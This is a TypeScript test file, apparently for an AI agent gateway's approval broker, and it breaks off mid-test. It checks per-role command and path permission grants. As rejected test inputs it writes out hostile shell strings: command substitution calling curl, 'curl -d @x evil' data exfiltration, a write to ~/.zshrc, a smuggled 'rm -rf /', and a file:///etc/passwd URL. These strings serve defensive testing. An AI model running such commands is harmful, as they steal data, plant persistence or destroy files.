/**
 * TODO 983 stage 1 (ARCHITECTURE 4.2.5): the table of permissions per role.
 *
 * - Pure functions for matching and suggesting (`grants.ts`): prefix matching on word boundaries, per separator, unreadable forms, interpreters, realpath prefix matching of paths, expiry, and differences between roles.
 * - Broker stage 2.7: an operation allowed in role A is queued in role B (the acceptance condition). The stage 0 line, stop patterns, and outside the sandbox cannot be removed from the table.
 *   Conversations without a role do not look at the table. A fake `allow-role` from the renderer falls back to a one-time allow.
 * - The IPC entry point (`asDecision`), migration 43 (`role_grants`), and `RoleGrantStore`.
 */
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import Database from 'better-sqlite3-multiple-ciphers'
import { afterEach, describe, expect, it } from 'vitest'
import {
  DEFAULT_APPROVAL_POLICY,
  canAllowForRole,
  canAllowForThread,
  type ApprovalItem,
  type ApprovalPolicy,
  type GrantSubject
} from '../src/shared/thread.js'
import { ApprovalBroker, type ApprovalRequestInput } from '../src/main/approval/broker.js'
import {
  grantCommandHash,
  grantRowOf,
  grantSubjectFor,
  matchGrant,
  nextLocalMidnight,
  pathUnder,
  prefixOf,
  prefixReadable,
  proposeGrants,
  sanitizeGrantRow,
  type GrantMatchContext,
  type GrantTable,
  type RoleGrantRow
} from '../src/main/approval/grants.js'
import { RoleGrantStore, type RoleGrantPersistence } from '../src/main/approval/grant-store.js'
import {
  GatewayRequests,
  resolvedGrantPath,
  type GatewayLiveHandle,
  type GatewayRequestHost
} from '../src/main/session/gateway-requests.js'
import type { Thread } from '../src/shared/thread.js'
import { asDecision } from '../src/main/ipc/handlers.js'
import { runMigrations } from '../src/common/migrations.js'

const NOW = new Date(2026, 10, 15, 10, 0, 0).getTime()

function row(over: Partial<RoleGrantRow>): RoleGrantRow {
  return {
    id: over.id ?? 'g1',
    roleKey: 'job:A',
    toolName: 'Bash',
    subjectKind: 'command-prefix',
    subject: 'docker build',
    subjectHash: null,
    access: null,
    scope: 'forever',
    threadId: null,
    expiresAt: null,
    source: 'approval',
    createdAt: NOW,
    lastUsedAt: null,
    useCount: 0,
    ...over
  }
}

function ctx(over: Partial<GrantMatchContext> = {}): GrantMatchContext {
  return { roleKey: 'job:A', toolName: 'Bash', threadId: 't1', now: NOW, quietSegment: () => false, home: '/home/u', ...over }
}

const cmd = (command: string): GrantSubject => ({ kind: 'command', command })

describe('照合の純関数 (grants.ts)', () => {
  it('前方一致は語の境で当てる', () => {
    const rows = [row({ subject: 'docker build' })]
    expect(matchGrant(cmd('docker build -t x .'), rows, ctx())).not.toBeNull()
    expect(matchGrant(cmd('docker build'), rows, ctx())).not.toBeNull()
    expect(matchGrant(cmd('docker buildx bake'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('docker run x'), rows, ctx())).toBeNull()
  })

  it('許した前方一致でも、区切りの残りに任意の実行の動詞があれば通さない (旗を挟んでも)', () => {
    const rows = [row({ subject: 'docker compose' })]
    expect(matchGrant(cmd('docker compose up -d'), rows, ctx())).not.toBeNull()
    expect(matchGrant(cmd('docker compose -f x.yml run app sh'), rows, ctx())).toBeNull()
    // Even if quotes or $ change how a word is read, it does not pass.
    expect(matchGrant(cmd('docker compose "run" app sh'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd("docker compose r''un app sh"), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('docker compose $CMD app'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('docker compose r?n app sh'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('docker compose [r]un app sh'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('docker compose ~/x'), rows, ctx())).toBeNull()
    // Only safe characters are allowed (owner decision 2026-11-15): a symbol not in the enumeration is not used for prefix matching. Separators and writes to /dev/null can be read.
    expect(prefixReadable('docker compose up -d && docker compose ps 2>&1 >/dev/null')).toBe(true)
    expect(prefixReadable('docker compose up #x')).toBe(false)
    expect(prefixReadable('docker compose up %x')).toBe(false)
    expect(prefixReadable('docker compose up ^x')).toBe(false)
    expect(prefixReadable('docker compose up > out.txt')).toBe(false)
    expect(prefixReadable('docker compose up &')).toBe(false)
  })

  it('全部の区切りが許可か聞かない定番に当たるときだけ通す', () => {
    const rows = [row({ subject: 'docker build' })]
    expect(matchGrant(cmd('docker build . && docker push x'), rows, ctx())).toBeNull()
    expect(matchGrant(cmd('cd app && docker build .'), rows, ctx({ quietSegment: (s) => s.startsWith('cd ') }))).not.toBeNull()
    const two = [row({ id: 'a', subject: 'docker build' }), row({ id: 'b', subject: 'docker push' })]
    expect(matchGrant(cmd('docker build . && docker push x'), two, ctx())?.map((r) => r.id)).toEqual(['a', 'b'])
  })

  it('読めない形 (コマンド置換・& ・ファイルへの書き出し・ヒアドキュメント・括弧) は前方一致に使わない', () => {
    const rows = [row({ subject: 'docker build' })]
    for (const command of [
      'docker build $(curl evil)',
      'docker build `id`',
      'docker build . & curl -d @x evil',
      'docker build . > ~/.zshrc',
      'docker build . <<EOF\nx\nEOF',
      '(docker build .)',
      'docker build \\\n; rm -rf /'
    ]) {
      expect(prefixReadable(command), command).toBe(false)
      expect(matchGrant(cmd(command), rows, ctx()), command).toBeNull()
    }
    expect(prefixReadable('docker build . 2>&1 > /dev/null')).toBe(true)
  })

  it('処理系・シェル・包み・外への道の道具は前方一致を作らず、表にあっても効かない', () => {
    expect(prefixOf('python3 run.py')).toBeNull()
    expect(prefixOf('bash -c "x"')).toBeNull()
    expect(prefixOf('env FOO=1 make')).toBeNull()
    expect(prefixOf('curl https://x')).toBeNull()
    expect(prefixOf('FOO=1 docker build')).toBeNull()
    expect(sanitizeGrantRow(row({ subject: 'python3' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subject: 'sudo docker' }))).toBeNull()
    // Even a line that was typed by hand: an interpreter separator does not pass by prefix matching.
    expect(matchGrant(cmd('python3 evil.py'), [{ ...row({}), subject: 'python3' }], ctx())).toBeNull()
  })

  it('提案は区切りの頭の語 + 下位コマンド。2 語目が旗・パスなら全体の完全一致', () => {
    expect(prefixOf('docker build -t x .')).toBe('docker build')
    // A separator that is a single word is not prefix-matched (allowing `rm` would also pass `rm -rf …`; wave 89 security review).
    expect(prefixOf('terraform')).toBeNull()
    expect(prefixOf('rm')).toBeNull()
    // Under any head, arbitrary-execution verbs, a number as the second word, a g-wrapped form, and a verb as the third word are not prefix-matched (wave 89 security review).
    expect(prefixOf('mise exec node')).toBeNull()
    expect(prefixOf('nx x build')).toBeNull()
    expect(prefixOf('lerna foreach test')).toBeNull()
    expect(prefixOf('gtimeout 60 make')).toBeNull()
    expect(prefixOf('foo 60 bar')).toBeNull()
    expect(prefixOf('git submodule foreach ls')).toBeNull()
    expect(prefixOf('git bisect run make')).toBeNull()
    expect(prefixOf('docker compose run app sh')).toBeNull()
    expect(prefixOf('docker compose -f x.yml run app sh')).toBeNull()
    expect(prefixOf('docker-compose run app sh')).toBeNull()
    expect(prefixOf('yarn workspace a build')).toBeNull()
    expect(prefixOf('docker push x')).toBe('docker push')
    expect(prefixOf('npm run lint')).toBe('npm run lint')
    expect(prefixOf('git push origin')).toBe('git push')
    expect(prefixOf('yarn run lint --fix')).toBe('yarn run lint')
    expect(prefixOf('terraform -chdir=x plan')).toBeNull()
    const proposal = proposeGrants(cmd('docker build . && docker push x'), [], ctx())
    expect(proposal).toEqual({
      candidates: [
        { subjectKind: 'command-prefix', subject: 'docker build', subjectHash: null, access: null },
        { subjectKind: 'command-prefix', subject: 'docker push', subjectHash: null, access: null }
      ]
    })
    // A separator that already passes is not offered as a candidate.
    const partial = proposeGrants(cmd('docker build . && docker push x'), [row({ subject: 'docker build' })], ctx())
    expect('candidates' in partial && partial.candidates.map((c) => c.subject)).toEqual(['docker push'])
    // An interpreter is matched as a whole by exact match (hash). The display comes after masking.
    const exact = proposeGrants(cmd('python3  run.py'), [], ctx())
    expect(exact).toEqual({
      candidates: [{ subjectKind: 'command-exact', subject: 'python3 run.py', subjectHash: grantCommandHash('python3 run.py'), access: null }]
    })
    const rows = [row({ subjectKind: 'command-exact', subject: 'python3 run.py', subjectHash: grantCommandHash('python3 run.py') })]
    expect(matchGrant(cmd('python3   run.py'), rows, ctx())).not.toBeNull()
    expect(matchGrant(cmd('python3 run.py --evil'), rows, ctx())).toBeNull()
  })

  it('秘密を含む値は行にしない', () => {
    expect(proposeGrants(cmd('docker login ghp_abcdefghijklmnopqrstuvwxyz0123456789'), [], ctx())).toEqual({
      candidates: [expect.objectContaining({ subjectKind: 'command-prefix', subject: 'docker login' })]
    })
    const secret = proposeGrants(cmd('ghp_abcdefghijklmnopqrstuvwxyz0123456789'), [], ctx())
    expect(secret).toEqual({ refused: 'secret' })
  })

  it('パスはディレクトリの前方一致 (/ の境)。write は read を含む', () => {
    expect(pathUnder('/a/b/c.txt', '/a/b')).toBe(true)
    expect(pathUnder('/a/b', '/a/b')).toBe(true)
    expect(pathUnder('/a/bc/x', '/a/b')).toBe(false)
    expect(pathUnder('/etc/passwd', '/')).toBe(false)
    const read = row({ toolName: 'Read', subjectKind: 'path-prefix', subject: '/w/a/proj', access: 'read' })
    const write = row({ toolName: 'Read', subjectKind: 'path-prefix', subject: '/w/a/proj', access: 'write' })
    const subject: GrantSubject = { kind: 'path', access: 'write', path: '/w/a/proj/a.txt', directory: false }
    expect(matchGrant(subject, [read], ctx({ toolName: 'Read' }))).toBeNull()
    expect(matchGrant(subject, [write], ctx({ toolName: 'Read' }))).not.toBeNull()
    expect(matchGrant({ ...subject, access: 'read' }, [write], ctx({ toolName: 'Read' }))).not.toBeNull()
    expect(proposeGrants({ kind: 'path', access: 'write', path: '/w/a/proj/a.txt', directory: false }, [], ctx())).toEqual({
      candidates: [{ subjectKind: 'path-prefix', subject: '/w/a/proj', subjectHash: null, access: 'write' }]
    })
    expect(proposeGrants({ kind: 'path', access: 'read', path: '/w/a/proj', directory: true }, [], ctx())).toEqual({
      candidates: [{ subjectKind: 'path-prefix', subject: '/w/a/proj', subjectHash: null, access: 'read' }]
    })
    expect(proposeGrants({ kind: 'path', access: 'write', path: '/x', directory: false }, [], ctx())).toEqual({ refused: 'none' })
  })

  it('親が広すぎる path-prefix は提案せず、ファイル自身にする (ホーム・祖先・ルート直下・ホームの dot ディレクトリ)', () => {
    const file = (path: string, access: 'read' | 'write' = 'write'): GrantSubject => ({ kind: 'path', access, path, directory: false })
    const own = (path: string, access: 'read' | 'write' = 'write') => ({
      candidates: [{ subjectKind: 'path-prefix', subject: path, subjectHash: null, access }]
    })
    for (const path of ['/home/u/notes.txt', '/home/x.txt', '/tmp/a.txt', '/tmp/x/a.txt', '/home/u/.ssh/config', '/home/u/.config/app/a.json']) {
      expect(proposeGrants(file(path), [], ctx()), path).toEqual(own(path))
    }
    expect(proposeGrants(file('/home/u/work/proj/a.txt'), [], ctx())).toEqual(own('/home/u/work/proj', 'write'))
    // The file's own line matches only the same file (not siblings or children).
    const rows = [row({ toolName: 'Write', subjectKind: 'path-prefix', subject: '/home/u/notes.txt', access: 'write' })]
    expect(matchGrant(file('/home/u/notes.txt'), rows, ctx({ toolName: 'Write' }))).not.toBeNull()
    expect(matchGrant(file('/home/u/other.txt'), rows, ctx({ toolName: 'Write' }))).toBeNull()
    // No permission is issued for a directory that reads the home directory itself.
    expect(proposeGrants({ kind: 'path', access: 'read', path: '/home/u', directory: true }, [], ctx())).toEqual({ refused: 'none' })
  })

  it('ラッパー・実行の下位コマンドは前方一致にしない (提案と照合で同じ判定)', () => {
    for (const command of [
      'timeout 5 rm -rf x', 'nice make', 'npx tsc', 'env X=1 make', 'xargs rm', 'sudo make', 'uv run script.py', 'poetry run pytest',
      'npm exec foo', 'pnpm exec foo', 'yarn exec foo', 'bundle exec rake', 'cargo run', 'npm run', 'yarn run'
    ]) {
      expect(prefixOf(command), command).toBeNull()
      expect(matchGrant(cmd(command), [row({ subject: command.split(' ').slice(0, 2).join(' ') })], ctx()), command).toBeNull()
    }
    expect(prefixOf('npm run build --silent')).toBe('npm run build')
    expect(sanitizeGrantRow(row({ subject: 'uv run' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subject: 'npm run' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subject: 'cargo build' }))).not.toBeNull()
  })

  it('パスは realpath で解く (symlink の先で照合する)', () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'aios-grants-')))
    try {
      mkdirSync(join(root, 'proj'))
      mkdirSync(join(root, 'secret'))
      writeFileSync(join(root, 'secret', 'k'), 'x')
      symlinkSync(join(root, 'secret'), join(root, 'proj', 'link'))
      const resolved = resolvedGrantPath('link/k', join(root, 'proj'))
      expect(resolved).toEqual({ path: join(root, 'secret', 'k'), directory: false })
      const grant = row({ toolName: 'Write', subjectKind: 'path-prefix', subject: join(root, 'proj'), access: 'write' })
      const subject: GrantSubject = { kind: 'path', access: 'write', path: resolved?.path ?? '', directory: false }
      expect(matchGrant(subject, [grant], ctx({ toolName: 'Write' }))).toBeNull()
      // For a file that does not exist yet, use the parent's realpath + the name. If the parent does not exist either, do not resolve (no matching on the literal string).
      expect(resolvedGrantPath('new.txt', join(root, 'proj'))).toEqual({ path: join(root, 'proj', 'new.txt'), directory: false })
      expect(resolvedGrantPath('no/such/x.txt', join(root, 'proj'))).toBeNull()
      expect(resolvedGrantPath('.', join(root, 'proj'))).toEqual({ path: join(root, 'proj'), directory: true })
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('期限の過ぎた「今日だけ」と別の会話の「この会話だけ」は効かない', () => {
    const today = row({ scope: 'today', expiresAt: nextLocalMidnight(NOW) })
    expect(matchGrant(cmd('docker build .'), [today], ctx())).not.toBeNull()
    expect(matchGrant(cmd('docker build .'), [today], ctx({ now: nextLocalMidnight(NOW) }))).toBeNull()
    const thread = row({ scope: 'thread', threadId: 't1' })
    expect(matchGrant(cmd('docker build .'), [thread], ctx())).not.toBeNull()
    expect(matchGrant(cmd('docker build .'), [thread], ctx({ threadId: 't2' }))).toBeNull()
    expect(nextLocalMidnight(NOW)).toBe(new Date(2026, 10, 16, 0, 0, 0).getTime())
  })

  it('role・道具の名前が違う行は効かない', () => {
    const rows = [row({ subject: 'docker build' })]
    expect(matchGrant(cmd('docker build .'), rows, ctx({ roleKey: 'job:B' }))).toBeNull()
    expect(matchGrant(cmd('docker build .'), rows, ctx({ toolName: 'Other' }))).toBeNull()
  })

  it('食い違う行は読み込みで落ちる', () => {
    expect(sanitizeGrantRow(row({}))).not.toBeNull()
    expect(sanitizeGrantRow(row({ scope: 'thread', threadId: null }))).toBeNull()
    expect(sanitizeGrantRow(row({ scope: 'today', expiresAt: null }))).toBeNull()
    expect(sanitizeGrantRow(row({ scope: 'forever', threadId: 't1' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subjectKind: 'nope' as never }))).toBeNull()
    expect(sanitizeGrantRow(row({ toolName: 'mcp__aios__approve', subjectKind: 'tool' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subjectKind: 'command-exact', subjectHash: null }))).toBeNull()
    expect(sanitizeGrantRow(row({ subjectKind: 'path-prefix', subject: '/', access: 'read' }))).toBeNull()
    expect(sanitizeGrantRow(row({ subjectKind: 'path-prefix', subject: 'rel', access: 'read' }))).toBeNull()
  })

  it('grantSubjectFor: シェル・書き込み・読み込み・Web の取得・それ以外', () => {
    const table: GrantTable = {
      shellTools: ['Sh'],
      commandField: 'command',
      readTools: ['Rd'],
      pathKeys: ['file_path', 'path'],
      fetchTools: ['Fetch', 'Search'],
      urlField: 'url',
      writeTools: ['Wr', 'Patch'],
      readOnlyTools: ['Todo']
    }
    const resolve = (raw: string): { path: string; directory: boolean } => ({ path: `/abs/${raw}`, directory: false })
    expect(grantSubjectFor(table, 'Sh', { command: 'ls' }, null, resolve)).toEqual({ kind: 'command', command: 'ls' })
    expect(grantSubjectFor(table, 'Wr', { file_path: 'a' }, 'a', resolve)).toEqual({
      kind: 'path',
      access: 'write',
      path: '/abs/a',
      directory: false
    })
    // A write tool whose target path cannot be pinned to one (no path, or patch) is not built into the tool-name line; it is not built (wave 89 security review).
    expect(grantSubjectFor(table, 'Wr', {}, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'Patch', { patch: '*** a\n*** b' }, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'Rd', { file_path: 'a' }, null, resolve)).toEqual({
      kind: 'path',
      access: 'read',
      path: '/abs/a',
      directory: false
    })
    // Searches with no starting point, and arguments that could look outside the starting point, are not built.
    expect(grantSubjectFor(table, 'Rd', { pattern: '*.ts' }, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'Rd', { path: 'a', pattern: '/etc/**' }, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'Fetch', { url: 'https://Example.COM/x' }, null, resolve)).toEqual({ kind: 'host', host: 'example.com' })
    expect(grantSubjectFor(table, 'Fetch', { url: 'file:///etc/passwd' }, null, resolve)).toBeNull()
    // A fetch or search with no URL sends a query outside. If it is not in the read-only set, it is not built (asks every time).
    expect(grantSubjectFor(table, 'Search', { query: 'q' }, null, resolve)).toBeNull()
    expect(grantSubjectFor({ ...table, readOnlyTools: ['Search'] }, 'Search', { query: 'q' }, null, resolve)).toEqual({ kind: 'tool' })
    // Stage 2 (owner decision 2026-11-15): a tool whose read or write nature is unknown (an MCP tool with no mark in the table) is not made a tool-name line (asks every time).
    // Only tools known to be read-only can be allowed by name.
    expect(grantSubjectFor(table, 'mcp__user__x', {}, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'mcp__user__send', { to: 'a' }, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'Todo', {}, null, resolve)).toEqual({ kind: 'tool' })
    // Not built for the gateway's own tools, nor for the confirmation of paths outside the working folder (TODO 1020).
    expect(grantSubjectFor(table, 'mcp__aios__openUrl', {}, null, resolve)).toBeNull()
    expect(grantSubjectFor(table, 'ExternalDirectory', { path: '/etc' }, null, resolve)).toBeNull()
  })
})

/** The Broker's fake store. */
class MemoryGrants implements RoleGrantPersistence {
  rows: RoleGrantRow[] = []
  loadRoleGrants(): readonly RoleGrantRow[] {
    return this.rows
  }
  addRoleGrants(rows: readonly RoleGrantRow[]): void {
    this.rows.push(...rows)
  }
  removeRoleGrants(ids: readonly string[]): void {
    this.rows = this.rows.filter((r) => !ids.includes(r.id))
  }
  touchRoleGrants(ids: readonly string[], now: number): void {
    this.rows = this.rows.map((r) => (ids.includes(r.id) ? { ...r, lastUsedAt: now, useCount: r.useCount + 1 } : r))
  }
}

const STRICT_OFF: ApprovalPolicy = { ...DEFAULT_APPROVAL_POLICY, autoAllowAll: false, autoAllowTools: [] }

function makeBroker(store: RoleGrantPersistence | null = new MemoryGrants(), policy: ApprovalPolicy = DEFAULT_APPROVAL_POLICY) {
  const queued: ApprovalItem[][] = []
  const decided: string[] = []
  const broker = new ApprovalBroker(
    {
      onChanged: (items) => queued.push([...items]),
      onDecided: (item, result) => decided.push(`${item.toolName}:${result.by}:${result.allowed}`)
    },
    policy,
    null,
    store
  )
  return { broker, queued, decided }
}

const ROLE_A = { key: 'job:A', name: '朝の集計' }
const ROLE_B = { key: 'job:B', name: '夜の掃除' }

function bash(command: string, over: Partial<ApprovalRequestInput> = {}): ApprovalRequestInput {
  return {
    threadId: 't1',
    threadTitle: 'job',
    toolName: 'Bash',
    summary: command,
    input: { command },
    strict: true,
    role: ROLE_A,
    grantSubject: { kind: 'command', command },
    ...over
  }
}

async function settle(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 0))
}

describe('Broker の段 2.7 (TODO 983)', () => {
  it('受け入れ条件: role A で許した操作が role B では承認待ちになる', async () => {
    const store = new MemoryGrants()
    const { broker } = makeBroker(store)
    const first = broker.request(bash('docker build .'))
    const item = broker.list()[0]
    expect(item?.roleGrant).toEqual({ roleName: '朝の集計', subjects: [{ kind: 'command-prefix', value: 'docker build' }] })
    expect(item !== undefined && canAllowForRole(item)).toBe(true)
    // Within the strict role frame, the line for 994 is not shown.
    expect(item !== undefined && canAllowForThread(item)).toBe(false)
    expect(broker.decide(item?.id ?? '', { kind: 'allow-role', scope: 'forever' })).toBe(true)
    await expect(first).resolves.toMatchObject({ allowed: true, by: 'user' })
    expect(store.rows).toHaveLength(1)
    expect(store.rows[0]).toMatchObject({ roleKey: 'job:A', subjectKind: 'command-prefix', subject: 'docker build', scope: 'forever' })

    // The next conversation with the same role passes without asking.
    await expect(broker.request(bash('docker build -t y .', { threadId: 't9' }))).resolves.toMatchObject({ allowed: true, by: 'rule' })
    // Queued in role B.
    void broker.request(bash('docker build .', { threadId: 't2', role: ROLE_B }))
    await settle()
    expect(broker.list().map((entry) => entry.threadId)).toEqual(['t2'])
    // A conversation without a role is also queued (the table is not looked up).
    void broker.request(bash('docker build .', { threadId: 't3', role: null }))
    await settle()
    expect(broker.list().map((entry) => entry.threadId)).toEqual(['t2', 't3'])
    expect(broker.list()[1]?.roleGrant).toBeUndefined()
  })

  it('再起動の後も置き場の行が効く (読み込みで検証する)', async () => {
    const store = new MemoryGrants()
    store.rows.push(grantRowOf({ subjectKind: 'command-prefix', subject: 'docker build', subjectHash: null, access: null }, 'job:A', 'Bash', 'forever', 't1', NOW))
    store.rows.push(row({ id: 'bad', subject: 'ruby' }))
    const { broker } = makeBroker(store)
    await expect(broker.request(bash('docker build .'))).resolves.toMatchObject({ allowed: true, by: 'rule' })
    void broker.request(bash('ruby x.rb'))
    await settle()
    expect(broker.list()).toHaveLength(1)
  })

  it('段 0 の線・停止パターン・sandbox の外は表があっても今までどおり', async () => {
    const store = new MemoryGrants()
    store.rows.push(row({ subject: 'docker build' }))
    store.rows.push(row({ id: 'tool', toolName: 'mcp__x__send', subjectKind: 'tool', subject: 'mcp__x__send' }))
    const policy: ApprovalPolicy = { ...DEFAULT_APPROVAL_POLICY, bashDenyPatterns: ['docker build --push'] }
    const { broker } = makeBroker(store, policy)
    const outbound = { channel: 'tool' as const, match: 'send', to: null, subject: null, body: null, command: null }
    void broker.request({
      threadId: 't1',
      threadTitle: 'job',
      toolName: 'mcp__x__send',
      summary: '',
      input: {},
      strict: true,
      role: ROLE_A,
      grantSubject: { kind: 'tool' },
      outbound
    })
    void broker.request(bash('docker build .', { persistence: { match: 'shell-startup', target: '~/.zshrc' } }))
    void broker.request(bash('docker build .', { egress: 'docker', secretRead: 'ssh-key' }))
    void broker.request(bash('docker build .', { alwaysAsk: true }))
    void broker.request(bash('docker build --push .'))
    await settle()
    const reasons = broker.list().map((entry) => entry.reason?.kind)
    expect(reasons).toEqual(['outbound', 'persistence', 'secret-read', 'side-effect', 'deny-pattern'])
    // Do not offer "allow this role from now on" for any of these.
    expect(broker.list().every((entry) => entry.roleGrant === undefined && !canAllowForRole(entry))).toBe(true)
    await expect(broker.request(bash('docker build .', { unsandboxed: true }))).resolves.toMatchObject({ allowed: false, by: 'system' })
  })

  it('renderer の偽の allow-role (条件に合わない要求・role の無い会話) は 1 回の許可に落ち、行を作らない', async () => {
    const store = new MemoryGrants()
    const { broker } = makeBroker(store, { ...DEFAULT_APPROVAL_POLICY, bashDenyPatterns: ['rm -rf'] })
    const denied = broker.request(bash('rm -rf build'))
    const noRole = broker.request(bash('docker build .', { role: null, threadId: 't2' }))
    await settle()
    const [a, b] = broker.list()
    expect(broker.decide(a?.id ?? '', { kind: 'allow-role', scope: 'forever' })).toBe(true)
    expect(broker.decide(b?.id ?? '', { kind: 'allow-role', scope: 'forever' })).toBe(true)
    await expect(denied).resolves.toMatchObject({ allowed: true, by: 'user' })
    await expect(noRole).resolves.toMatchObject({ allowed: true, by: 'user' })
    expect(store.rows).toHaveLength(0)
    // An unknown expiry does not create a line either (even for a call that does not go through IPC).
    const odd = broker.request(bash('docker build .'))
    const item = broker.list()[0]
    broker.decide(item?.id ?? '', { kind: 'allow-role', scope: 'someday' as never })
    await expect(odd).resolves.toMatchObject({ allowed: true })
    expect(store.rows).toHaveLength(0)
  })

  it('値は積んだときに main が決めたもの。今日だけ・この会話だけの期限が付く', async () => {
    const store = new MemoryGrants()
    const { broker } = makeBroker(store)
    void broker.request(bash('docker build .'))
    broker.decide(broker.list()[0]?.id ?? '', { kind: 'allow-role', scope: 'today' })
    void broker.request(bash('terraform plan', { threadId: 't5' }))
    await settle()
    broker.decide(broker.list()[0]?.id ?? '', { kind: 'allow-role', scope: 'thread' })
    expect(store.rows.map((r) => [r.subject, r.scope, r.threadId, r.expiresAt === null])).toEqual([
      ['docker build', 'today', null, false],
      ['terraform plan', 'thread', 't5', true]
    ])
    // This conversation only: it is queued in other conversations.
    await expect(broker.request(bash('terraform plan', { threadId: 't5' }))).resolves.toMatchObject({ by: 'rule' })
    void broker.request(bash('terraform plan', { threadId: 't6' }))
    await settle()
    expect(broker.list().map((entry) => entry.threadId)).toEqual(['t6'])
  })

  it('許可を足したら同じ role で積んである要求を解く (別の role・通らないものは残す)', async () => {
    const { broker } = makeBroker()
    const first = broker.request(bash('docker build .'))
    const sameRole = broker.request(bash('docker build -t z .', { threadId: 't2' }))
    void broker.request(bash('docker build .', { threadId: 't3', role: ROLE_B }))
    void broker.request(bash('terraform apply', { threadId: 't4' }))
    await settle()
    expect(broker.list()).toHaveLength(4)
    broker.decide(broker.list()[0]?.id ?? '', { kind: 'allow-role', scope: 'forever' })
    await expect(first).resolves.toMatchObject({ allowed: true, by: 'user' })
    await expect(sameRole).resolves.toMatchObject({ allowed: true, by: 'rule' })
    expect(broker.list().map((entry) => entry.threadId)).toEqual(['t3', 't4'])
  })

  it('自分の提案を持たない待ち (秘密で提案が作れなかった) も、同じ role なら新しい表で見直して解く', async () => {
    const { broker } = makeBroker()
    const write = (path: string, threadId: string): ApprovalRequestInput => ({
      threadId,
      threadTitle: 'job',
      toolName: 'Write',
      summary: path,
      input: { file_path: path },
      strict: true,
      role: ROLE_A,
      grantSubject: { kind: 'path', access: 'write', path, directory: false }
    })
    const first = broker.request(write('/w/a/proj/a.txt', 't1'))
    // A name with a secret in its parent: no suggestion can be made (refused: secret), and it has no roleGrant of its own.
    const noOffer = broker.request(write('/w/a/proj/ghp_abcdefghijklmnopqrstuvwxyz0123456789/b.txt', 't2'))
    await settle()
    expect(broker.list()[1]?.roleGrant).toBeUndefined()
    broker.decide(broker.list()[0]?.id ?? '', { kind: 'allow-role', scope: 'forever' })
    await expect(first).resolves.toMatchObject({ allowed: true, by: 'user' })
    await expect(noOffer).resolves.toMatchObject({ allowed: true, by: 'rule' })
  })

  it('厳格でない role の既定の外の道具 (not-default) にも出る。読み書きのパス・ホスト', async () => {
    const store = new MemoryGrants()
    const { broker } = makeBroker(store, STRICT_OFF)
    void broker.request({
      threadId: 't1',
      threadTitle: 'job',
      toolName: 'Fetch',
      summary: '',
      input: { url: 'https://example.com/a' },
      strict: false,
      role: ROLE_A,
      grantSubject: { kind: 'host', host: 'example.com' }
    })
    await settle()
    const item = broker.list()[0]
    expect(item?.reason?.kind).toBe('not-default')
    expect(item?.roleGrant?.subjects).toEqual([{ kind: 'host', value: 'example.com' }])
    broker.decide(item?.id ?? '', { kind: 'allow-role', scope: 'forever' })
    await expect(
      broker.request({
        threadId: 't2',
        threadTitle: 'job',
        toolName: 'Fetch',
        summary: '',
        input: {},
        strict: false,
        role: ROLE_A,
        grantSubject: { kind: 'host', host: 'example.com' }
      })
    ).resolves.toMatchObject({ allowed: true, by: 'rule' })
    void broker.request({
      threadId: 't3',
      threadTitle: 'job',
      toolName: 'Fetch',
      summary: '',
      input: {},
      strict: false,
      role: ROLE_A,
      grantSubject: { kind: 'host', host: 'evil.example.com' }
    })
    await settle()
    expect(broker.list()).toHaveLength(1)
  })

  it('置き場に書けなければメモリにも足さない', async () => {
    const failing: RoleGrantPersistence = {
      loadRoleGrants: () => [],
      addRoleGrants: () => {
        throw new Error('disk')
      },
      removeRoleGrants: () => undefined,
      touchRoleGrants: () => undefined
    }
    const { broker } = makeBroker(failing)
    const first = broker.request(bash('docker build .'))
    broker.decide(broker.list()[0]?.id ?? '', { kind: 'allow-role', scope: 'forever' })
    await expect(first).resolves.toMatchObject({ allowed: true })
    void broker.request(bash('docker build .', { threadId: 't2' }))
    await settle()
    expect(broker.list()).toHaveLength(1)
  })
})

describe('gateway の approve の段が role と対象を載せる', () => {
  async function approveWith(role: { key: string; name: string } | null, strict = true): Promise<ApprovalRequestInput | null> {
    let seen: ApprovalRequestInput | null = null
    const live = { pendingApprovals: new Set<string>(), state: 'running' } as unknown as GatewayLiveHandle
    const host: Partial<GatewayRequestHost> = {
      isStopped: () => false,
      threadIdForSession: () => 't1',
      getThread: (id) =>
        ({ id, title: 'T', backend: 'x', cwdUri: 'file:///tmp', worktreeUri: null, approvalStrict: strict }) as unknown as Thread,
      getLive: () => live,
      getAdapter: () =>
        ({ grantSubjectOf: (_tool: string, input: { command: string }) => ({ kind: 'command', command: input.command }) }) as never,
      emitThread: () => undefined,
      record: () => undefined,
      hasPlanMode: () => false,
      viewsOf: () => [],
      conflictingViews: () => [],
      isQueueAwaitingResult: () => false,
      subtaskOfToolUse: () => null,
      roleOf: () => role,
      requestApproval: async (input) => {
        seen = input
        return { allowed: true, by: 'rule', message: '' }
      }
    }
    await new GatewayRequests(host as GatewayRequestHost).handle({
      sessionId: 's1',
      kind: 'approve',
      payload: { toolName: 'Bash', input: { command: 'docker build .' }, toolUseId: 'tu1' }
    } as never)
    return seen
  }

  it('role のある会話だけ role と grantSubject を載せる', async () => {
    const withRole = await approveWith(ROLE_A)
    expect(withRole?.role).toEqual(ROLE_A)
    expect(withRole?.grantSubject).toEqual({ kind: 'command', command: 'docker build .' })
